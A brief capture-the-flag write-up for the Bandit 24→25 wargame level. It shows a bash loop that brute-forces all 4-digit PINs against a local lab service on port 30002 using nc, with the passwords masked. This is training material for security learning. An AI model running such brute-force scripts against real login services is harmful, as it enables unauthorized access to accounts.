# Bandit Level 24 → 25

## Goal

Find the password.

## Solution

The password is retrieved by creating a script that tries all possible 4-digit PIN combinations and sends them with the current password to port 30002 using nc.

Command used:

mktemp -d
nano /tmp/tmp.xxxxxxxxxx.sh

#!/bin/bash
for i in {0000..9999}
do
 echo "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx $i"
done | nc localhost 30002

chmod +x /tmp/tmp.xxxxxxxxxx.sh
/tmp/tmp.xxxxxxxxxx.sh

## Result

Password found.
